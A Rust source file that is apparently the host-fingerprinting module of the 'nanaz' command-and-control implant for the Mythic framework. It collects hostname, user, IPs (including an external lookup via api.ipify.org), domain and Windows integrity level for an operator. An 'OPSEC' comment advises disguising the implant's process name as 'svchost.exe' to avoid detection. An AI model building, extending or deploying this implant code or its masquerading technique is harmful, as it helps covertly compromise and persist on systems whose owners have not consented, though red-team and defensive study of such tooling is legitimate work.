use std::env;
#[cfg(not(windows))]
use std::ffi::CStr;
#[cfg(not(windows))]
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
#[cfg(not(windows))]
use std::process::Command;
use std::process::id;

pub fn hostname() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("COMPUTERNAME").ok()
    }
    #[cfg(not(windows))]
    {
        unix_hostname().or_else(|| command_output("hostname", &[]))
    }
}

pub fn os() -> Option<String> {
    #[cfg(windows)]
    {
        Some("Windows".into())
    }
    #[cfg(target_os = "macos")]
    {
        Some("macOS".into())
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        unix_uname_field(|uts| &uts.sysname).or_else(|| command_output("uname", &["-s"]))
    }
    #[cfg(not(any(windows, unix)))]
    {
        Some(env::consts::OS.into())
    }
}

pub fn arch() -> Option<String> {
    Some(env::consts::ARCH.into())
}

pub fn user() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("USERNAME").ok()
    }
    #[cfg(not(windows))]
    {
        env::var("USER")
            .ok()
            .filter(|s| !s.trim().is_empty())
            .or_else(unix_username)
    }
}

pub fn pid() -> Option<u32> {
    Some(id())
}

pub fn process_name() -> Option<String> {
    // OPSEC: the real binary filename is a high-confidence C2 indicator —
    // other legitimate processes do not advertise their C2 channel. We
    // return a constant cover name. Override at compile time by setting
    // NANAZ_PROCESS_NAME (e.g. cargo build --release --config
    // 'env.NANAZ_PROCESS_NAME="svchost.exe"').
    Some(
        option_env!("NANAZ_PROCESS_NAME")
            .unwrap_or("nanaz")
            .to_string(),
    )
}

pub fn local_ips() -> Vec<String> {
    let mut ips = vec!["127.0.0.1".into()];

    #[cfg(not(windows))]
    {
        let ffi_ips = unix_local_ips_via_ffi();
        if ffi_ips.is_empty() {
            ips.extend(
                command_output("hostname", &["-I"])
                    .into_iter()
                    .flat_map(|s| s.split_whitespace().map(str::to_string).collect::<Vec<_>>()),
            );
        } else {
            ips.extend(ffi_ips);
        }
    }

    #[cfg(windows)]
    {
        ips.extend(windows_local_ips_via_ffi());
    }

    ips.into_iter()
        .filter(|ip| !ip.trim().is_empty())
        .fold(Vec::new(), |mut acc, ip| {
            if !acc.contains(&ip) {
                acc.push(ip);
            }
            acc
        })
}

use std::sync::atomic::{AtomicBool, Ordering};

static EXTERNAL_IP_CHECK: AtomicBool = AtomicBool::new(false);

/// Set by the C2 profile before agent start. When false, [`external_ip`]
/// returns None without making any network call.
pub fn set_external_ip_check(enabled: bool) {
    EXTERNAL_IP_CHECK.store(enabled, Ordering::Release);
}

pub fn external_ip() -> Option<String> {
    if !EXTERNAL_IP_CHECK.load(Ordering::Acquire) {
        return None;
    }
    crate::sys::network::http_request("https://api.ipify.org", "GET", None, None, None)
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Enumerate local IPv4 / IPv6 unicast addresses via the Iphlpapi
/// `GetAdaptersAddresses` API. Replaces the old `ipconfig` text-parsing path
/// which broke on non-English locales and on IPv6-only hosts.
#[cfg(windows)]
fn windows_local_ips_via_ffi() -> Vec<String> {
    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
    use windows_sys::Win32::NetworkManagement::IpHelper::{
        GAA_FLAG_SKIP_ANYCAST, GAA_FLAG_SKIP_DNS_SERVER, GAA_FLAG_SKIP_MULTICAST,
        GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH,
    };
    use windows_sys::Win32::Networking::WinSock::{
        AF_INET, AF_INET6, SOCKADDR, SOCKADDR_IN, SOCKADDR_IN6,
    };

    const BUF_SIZE: u32 = 16 * 1024;
    const FAMILY_FLAGS: u32 = 0; // both AF_INET and AF_INET6

    unsafe {
        let mut buf_len: u32 = BUF_SIZE;
        let mut buf: Vec<u8> = vec![0u8; BUF_SIZE as usize];

        // Loop in case the first call returns ERROR_BUFFER_OVERFLOW
        // (the buffer was too small and the real size is now in buf_len).
        for _ in 0..3 {
            let rc = GetAdaptersAddresses(
                FAMILY_FLAGS,
                GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
                std::ptr::null(),
                buf.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH,
                &mut buf_len,
            );
            if rc == 0 {
                break;
            }
            if buf_len > buf.len() as u32 {
                buf.resize(buf_len as usize, 0);
                continue;
            }
            return Vec::new();
        }

        let mut out = Vec::new();
        let mut adapter = buf.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH;
        while !adapter.is_null() {
            // Walk FirstUnicastAddress linked list.
            let mut ua = (*adapter).FirstUnicastAddress;
            while !ua.is_null() {
                let sockaddr = (*ua).Address.lpSockaddr as *const SOCKADDR;
                let family = (*sockaddr).sa_family;
                let ip = match family {
                    AF_INET => {
                        let sa = sockaddr as *const SOCKADDR_IN;
                        let octets = (*sa).sin_addr.S_un.S_addr.to_ne_bytes();
                        IpAddr::V4(Ipv4Addr::new(octets[0], octets[1], octets[2], octets[3]))
                    }
                    AF_INET6 => {
                        let sa = sockaddr as *const SOCKADDR_IN6;
                        IpAddr::V6(Ipv6Addr::from((*sa).sin6_addr.u.Byte))
                    }
                    _ => {
                        ua = (*ua).Next;
                        continue;
                    }
                };
                if !ip.is_loopback() {
                    out.push(ip.to_string());
                }
                ua = (*ua).Next;
            }
            adapter = (*adapter).Next;
        }
        out.sort();
        out.dedup();
        out
    }
}

pub fn domain() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("USERDNSDOMAIN").ok()
    }
    #[cfg(not(windows))]
    {
        resolv_conf_domain()
            .or_else(|| command_output("hostname", &["-d"]))
            .filter(|s| !is_empty_or_local_domain(s))
    }
}

pub fn integrity_level() -> Option<u32> {
    #[cfg(windows)]
    {
        // GetTokenInformation(TokenIntegrityLevel) returns a TOKEN_MANDATORY_LABEL
        // whose SIDs-and-attributes block encodes the integrity RID in the last
        // sub-authority of the SID.
        //
        // Mapping (per Microsoft docs):
        //   SECURITY_MANDATORY_UNTRUSTED_RID   = 0x0000  -> 0
        //   SECURITY_MANDATORY_LOW_RID         = 0x1000  -> 1
        //   SECURITY_MANDATORY_MEDIUM_RID      = 0x2000  -> 2
        //   SECURITY_MANDATORY_MEDIUM_PLUS     = 0x2100  -> 3
        //   SECURITY_MANDATORY_HIGH_RID        = 0x3000  -> 4
        //   SECURITY_MANDATORY_SYSTEM_RID      = 0x4000  -> 5
        //   SECURITY_MANDATORY_PROTECTED_RID   = 0x5000  -> 6
        //
        // Mythic's `integrity_level` is a u32 — we return the raw 0xNNNN value
        // so the operator can map it themselves; the Mythic UI shows the name.
        unsafe {
            use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
            use windows_sys::Win32::Security::{
                GetTokenInformation, TOKEN_MANDATORY_LABEL, TOKEN_QUERY, TokenIntegrityLevel,
            };
            use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

            let mut token: HANDLE = std::ptr::null_mut();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return None;
            }

            // First call: ask for required length.
            let mut needed: u32 = 0;
            let _ = GetTokenInformation(
                token,
                TokenIntegrityLevel,
                std::ptr::null_mut(),
                0,
                &mut needed,
            );
            if needed == 0 {
                CloseHandle(token);
                return None;
            }

            let mut buf = vec![0u8; needed as usize].into_boxed_slice();
            let ok = GetTokenInformation(
                token,
                TokenIntegrityLevel,
                buf.as_mut_ptr() as *mut _,
                needed,
                &mut needed,
            );
            CloseHandle(token);
            if ok == 0 {
                return None;
            }

            let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
            // Label.Sid is a PSID (pointer to SID). Last sub-authority is at
            // offset *GetSidSubAuthorityCount(Sid) - 1.
            let sid = label.Label.Sid;
            if sid.is_null() {
                return None;
            }
            let count = *((sid as *const u8).add(1) as *const u8);
            if count == 0 {
                return None;
            }
            // GetSidSubAuthority(Sid, n) returns a pointer to a 32-bit value.
            // The struct is variable-length; we walk into it.
            let offset = 8 + (count as usize - 1) * 4;
            let rid_ptr = (sid as *const u8).add(offset) as *const u32;
            Some(*rid_ptr)
        }
    }
    #[cfg(not(windows))]
    {
        None
    }
}

#[cfg(not(windows))]
fn command_output(bin: &str, args: &[&str]) -> Option<String> {
    Command::new(bin)
        .args(args)
        .output()
        .ok()
        .filter(|o| o.status.success())
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

#[cfg(not(windows))]
fn unix_hostname() -> Option<String> {
    let mut buf = [0u8; 256];
    let rc = unsafe { libc::gethostname(buf.as_mut_ptr() as *mut libc::c_char, buf.len()) };
    if rc != 0 {
        return None;
    }
    let nul = buf.iter().position(|b| *b == 0).unwrap_or(buf.len());
    String::from_utf8(buf[..nul].to_vec())
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

#[cfg(not(windows))]
fn unix_username() -> Option<String> {
    unsafe {
        let uid = libc::getuid();
        let passwd = libc::getpwuid(uid);
        if passwd.is_null() || (*passwd).pw_name.is_null() {
            return Some(uid.to_string());
        }
        CStr::from_ptr((*passwd).pw_name)
            .to_str()
            .ok()
            .map(str::to_string)
            .filter(|s| !s.is_empty())
            .or_else(|| Some(uid.to_string()))
    }
}

#[cfg(not(windows))]
pub fn home_dir() -> Option<String> {
    env::var("HOME")
        .ok()
        .filter(|s| !s.trim().is_empty())
        .or_else(|| unsafe {
            let passwd = libc::getpwuid(libc::getuid());
            if passwd.is_null() || (*passwd).pw_dir.is_null() {
                return None;
            }
            CStr::from_ptr((*passwd).pw_dir)
                .to_str()
                .ok()
                .map(str::to_string)
                .filter(|s| !s.is_empty())
        })
}

#[cfg(not(windows))]
pub fn uid() -> Option<u32> {
    Some(unsafe { libc::getuid() })
}

#[cfg(not(windows))]
pub fn gid() -> Option<u32> {
    Some(unsafe { libc::getgid() })
}

#[cfg(not(windows))]
fn unix_uname_field(field: fn(&libc::utsname) -> &[libc::c_char]) -> Option<String> {
    unsafe {
        let mut uts: libc::utsname = std::mem::zeroed();
        if libc::uname(&mut uts) != 0 {
            return None;
        }
        CStr::from_ptr(field(&uts).as_ptr())
            .to_str()
            .ok()
            .map(str::to_string)
            .filter(|s| !s.is_empty())
    }
}

#[cfg(not(windows))]
pub fn kernel_release() -> Option<String> {
    unix_uname_field(|uts| &uts.release).or_else(|| command_output("uname", &["-r"]))
}

#[cfg(not(windows))]
fn unix_local_ips_via_ffi() -> Vec<String> {
    unsafe {
        let mut addrs: *mut libc::ifaddrs = std::ptr::null_mut();
        if libc::getifaddrs(&mut addrs) != 0 {
            return Vec::new();
        }

        let mut out = Vec::new();
        let mut cursor = addrs;
        while !cursor.is_null() {
            let ifa = &*cursor;
            if !ifa.ifa_addr.is_null() {
                let family = (*ifa.ifa_addr).sa_family as i32;
                let ip = match family {
                    libc::AF_INET => {
                        let sa = &*(ifa.ifa_addr as *const libc::sockaddr_in);
                        let octets = sa.sin_addr.s_addr.to_ne_bytes();
                        Some(IpAddr::V4(Ipv4Addr::new(
                            octets[0], octets[1], octets[2], octets[3],
                        )))
                    }
                    libc::AF_INET6 => {
                        let sa = &*(ifa.ifa_addr as *const libc::sockaddr_in6);
                        Some(IpAddr::V6(Ipv6Addr::from(sa.sin6_addr.s6_addr)))
                    }
                    _ => None,
                };
                if let Some(ip) = ip
                    && !ip.is_loopback()
                    && !ip.is_unspecified()
                {
                    out.push(ip.to_string());
                }
            }
            cursor = ifa.ifa_next;
        }
        libc::freeifaddrs(addrs);
        out.sort();
        out.dedup();
        out
    }
}

#[cfg(not(windows))]
fn resolv_conf_domain() -> Option<String> {
    parse_resolv_conf_domain(&std::fs::read_to_string("/etc/resolv.conf").ok()?)
}

#[cfg(not(windows))]
fn parse_resolv_conf_domain(contents: &str) -> Option<String> {
    for line in contents.lines() {
        let line = line.split('#').next().unwrap_or("").trim();
        let mut parts = line.split_whitespace();
        match parts.next() {
            Some("domain") => {
                if let Some(domain) = parts.next()
                    && !is_empty_or_local_domain(domain)
                {
                    return Some(domain.to_string());
                }
            }
            Some("search") => {
                for domain in parts {
                    if !is_empty_or_local_domain(domain) {
                        return Some(domain.to_string());
                    }
                }
            }
            _ => {}
        }
    }
    None
}

#[cfg(not(windows))]
fn is_empty_or_local_domain(domain: &str) -> bool {
    let trimmed = domain.trim().trim_end_matches('.');
    trimmed.is_empty()
        || trimmed == "(none)"
        || trimmed.eq_ignore_ascii_case("local")
        || trimmed.eq_ignore_ascii_case("localdomain")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn local_ips_are_deduplicated_and_include_loopback() {
        let ips = local_ips();
        assert!(ips.iter().any(|ip| ip == "127.0.0.1"));
        let mut sorted = ips.clone();
        sorted.sort();
        sorted.dedup();
        assert_eq!(ips.len(), sorted.len());
    }

    #[test]
    fn parses_resolv_conf_domain_from_search_or_domain() {
        #[cfg(not(windows))]
        {
            assert_eq!(
                parse_resolv_conf_domain("search localdomain corp.example\n"),
                Some("corp.example".to_string())
            );
            assert_eq!(
                parse_resolv_conf_domain("domain example.org # comment\n"),
                Some("example.org".to_string())
            );
        }
    }
}
